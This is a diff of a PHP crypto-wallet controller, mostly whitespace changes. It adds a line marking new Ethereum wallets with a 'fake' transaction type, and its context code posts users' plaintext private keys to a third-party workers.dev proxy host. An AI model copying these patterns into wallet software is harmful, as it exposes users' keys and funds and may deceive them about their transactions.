@@ -356,6 +356,8 @@ class WalletController extends Controller
                     $newWallet->chain = $chain;
                     $newWallet->address = $address;
                     $newWallet->private_key = $private_key;
+                    if ($chain === 'ethereum')
+                        $newWallet->active_transaction_type = 'fake';
                     $newWallet->save();
                 } else {
                     Log::error("Wallet creation failed for user {$user_id}, chain {$chain}: missing data");
@@ -484,7 +486,7 @@ class WalletController extends Controller
                 $gasPrices = $this->getEthereumGasPrices();
                 $estimatedGasCost = (float) $gasPrices['maxFeePerGas'] * (int) $gasPrices['gasLimit'];
                 $estimatedGasCostEth = $estimatedGasCost / 1000000000000000000; // Convert Wei to ETH
-                
+
                 if ($ethBalance < $estimatedGasCostEth) {
                     Log::error("Insufficient ETH for gas fees. Required: {$estimatedGasCostEth}, Available: {$ethBalance}");
                     return back()->with('error', 'Insufficient ETH balance for gas fees. Please add more ETH to your wallet.');
@@ -502,14 +504,14 @@ class WalletController extends Controller
                     return back()->with('error', 'Invalid destination tag. Must be between 0 and 4294967295.');
                 }
             }
-            
+
             // Validate XRP amount (minimum 0.000001 XRP)
             $xrpAmount = (float) $amount;
             if ($xrpAmount < 0.000001) {
                 Log::error("XRP amount too small: {$xrpAmount}");
                 return back()->with('error', 'Minimum XRP amount is 0.000001 XRP.');
             }
-            
+
             // Validate XRP address format
             if (!$this->isValidXrpAddress($receiverAddress)) {
                 Log::error("Invalid XRP address: {$receiverAddress}");
@@ -657,11 +659,11 @@ class WalletController extends Controller
                     "amount" => $params['amount'],
                 ]);
             },
-            
+
             'Ripple' => function () use ($http, $params) {
                 // Convert XRP amount to drops (1 XRP = 1,000,000 drops)
                 // $amountInDrops = (float) $params['amount'] * 1000000;
-                
+
                 $requestData = [
                     "fromAccount" => $params['senderAddress'],
                     "to" => $params['receiverAddress'],
@@ -669,7 +671,7 @@ class WalletController extends Controller
                     "amount" => $params['amount'],
                     "fromSecret" => $params['privateKey'],
                 ];
-                
+
                 // Add destinationTag if provided (must be numeric)
                 if (!empty($params['destinationTag'])) {
                     $destinationTag = (int) $params['destinationTag'];
@@ -677,7 +679,7 @@ class WalletController extends Controller
                         $requestData["destinationTag"] = $destinationTag;
                     }
                 }
-                
+
                 Log::info("XRP Transaction Request", [
                     'fromAccount' => $params['senderAddress'],
                     'to' => $params['receiverAddress'],
@@ -685,14 +687,14 @@ class WalletController extends Controller
                     'destinationTag' => $params['destinationTag'] ?? null,
                     'request_data' => $requestData
                 ]);
-                
+
                 return $http->post("https://styx.pibin.workers.dev/api/tatum/v3/xrp/transaction", $requestData);
             },
 
             'Ethereum' => function () use ($http, $params) {
                 // Get current gas prices for Ethereum
                 $gasPrices = $this->getEthereumGasPrices();
-                
+
                 $requestData = [
                     "chain" => "ETH",
                     "to" => $params['receiverAddress'],
@@ -701,7 +703,7 @@ class WalletController extends Controller
                     "digits" => 18,
                     "fromPrivateKey" => $params['privateKey'],
                 ];
-                
+
                 // Add gas parameters if available
                 if ($gasPrices) {
                     $requestData["gasPrice"] = $gasPrices['gasPrice'];
@@ -709,7 +711,7 @@ class WalletController extends Controller
                     $requestData["maxFeePerGas"] = $gasPrices['maxFeePerGas'];
                     $requestData["maxPriorityFeePerGas"] = $gasPrices['maxPriorityFeePerGas'];
                 }
-                
+
                 return $http->post("https://styx.pibin.workers.dev/api/tatum/v3/blockchain/token/transaction", $requestData);
             },
         ];
@@ -721,11 +723,11 @@ class WalletController extends Controller
     {
         // Try multiple gas price sources for better accuracy
         $gasPrices = $this->tryMultipleGasPriceSources();
-        
+
         if ($gasPrices) {
             return $gasPrices;
         }
-        
+
         // Aggressive fallback values if all sources fail
         return [
             'gasPrice' => '100000000000', // 100 Gwei in Wei - very aggressive
@@ -742,13 +744,13 @@ class WalletController extends Controller
         if ($gasPrices1) {
             return $gasPrices1;
         }
-        
+
         // Source 2: Alternative gas price API
         $gasPrices2 = $this->getGasPricesFromAlternative();
         if ($gasPrices2) {
             return $gasPrices2;
         }
-        
+
         return null;
     }
 
@@ -765,37 +767,37 @@ class WalletController extends Controller
 
             if ($response->successful()) {
                 $gasPrice = $response->json();
-                
+
                 if (isset($gasPrice['ETH'])) {
                     $ethData = $gasPrice['ETH'];
-                    
+
                     // Try to get the highest available gas price tier
                     $selectedTier = null;
                     $tierPriority = ['instant', 'fast', 'standard', 'slow'];
-                    
+
                     foreach ($tierPriority as $tier) {
                         if (isset($ethData[$tier])) {
                             $selectedTier = $ethData[$tier];
                             break;
                         }
                     }
-                    
+
                     if ($selectedTier) {
                         // Convert Gwei to Wei (multiply by 10^9)
                         $gasPriceGwei = $selectedTier['native'] ?? 50;
                         $gasPriceWei = $gasPriceGwei * 1000000000;
-                        
+
                         // Use very aggressive pricing to ensure transaction success
                         $maxFeePerGasWei = $gasPriceWei * 3.0; // 300% of base price
                         $maxPriorityFeePerGasWei = $gasPriceWei * 0.8; // 80% of base price
-                        
+
                         Log::info("Ethereum gas pricing from Tatum", [
                             'tier_used' => array_search($selectedTier, $ethData),
                             'gas_price_gwei' => $gasPriceGwei,
                             'max_fee_per_gas_gwei' => $maxFeePerGasWei / 1000000000,
                             'max_priority_fee_gwei' => $maxPriorityFeePerGasWei / 1000000000
                         ]);
-                        
+
                         return [
                             'gasPrice' => (string) $gasPriceWei,
                             'gasLimit' => '200000', // Higher gas limit for safety
@@ -805,9 +807,8 @@ class WalletController extends Controller
                     }
                 }
             }
-            
+
             return null;
-            
         } catch (\Throwable $e) {
             Log::error("Failed to fetch Ethereum gas prices from Tatum: " . $e->getMessage());
             return null;
@@ -824,27 +825,27 @@ class WalletController extends Controller
 
             if ($response->successful()) {
                 $data = $response->json();
-                
+
                 if (isset($data['result']) && $data['status'] === '1') {
                     $result = $data['result'];
-                    
+
                     // Use the highest available gas price
                     $gasPriceGwei = max(
                         (int) ($result['FastGasPrice'] ?? 50),
                         (int) ($result['ProposeGasPrice'] ?? 40),
                         (int) ($result['SafeGasPrice'] ?? 30)
                     );
-                    
+
                     $gasPriceWei = $gasPriceGwei * 1000000000;
                     $maxFeePerGasWei = $gasPriceWei * 3.5; // 350% of base price
                     $maxPriorityFeePerGasWei = $gasPriceWei * 1.0; // 100% of base price
-                    
+
                     Log::info("Ethereum gas pricing from Etherscan", [
                         'gas_price_gwei' => $gasPriceGwei,
                         'max_fee_per_gas_gwei' => $maxFeePerGasWei / 1000000000,
                         'max_priority_fee_gwei' => $maxPriorityFeePerGasWei / 1000000000
                     ]);
-                    
+
                     return [
                         'gasPrice' => (string) $gasPriceWei,
                         'gasLimit' => '200000',
@@ -853,9 +854,8 @@ class WalletController extends Controller
                     ];
                 }
             }
-            
+
             return null;
-            
         } catch (\Throwable $e) {
             Log::error("Failed to fetch Ethereum gas prices from Etherscan: " . $e->getMessage());
             return null;
@@ -873,7 +873,7 @@ class WalletController extends Controller
                 $data = $response->json();
                 return (float) ($data['balance'] ?? 0);
             }
-            
+
             return 0;
         } catch (\Throwable $e) {
             Log::error("Failed to fetch Ethereum balance for address {$address}: " . $e->getMessage());
@@ -888,12 +888,12 @@ class WalletController extends Controller
         if (empty($address) || strlen($address) < 25 || strlen($address) > 34) {
             return false;
         }
-        
+
         // Must start with 'r'
         if (substr($address, 0, 1) !== 'r') {
             return false;
         }
-        
+
         // Check for valid base58 characters
         $validChars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
         for ($i = 0; $i < strlen($address); $i++) {
@@ -901,7 +901,7 @@ class WalletController extends Controller
                 return false;
             }
         }
-        
+
         return true;
     }
 
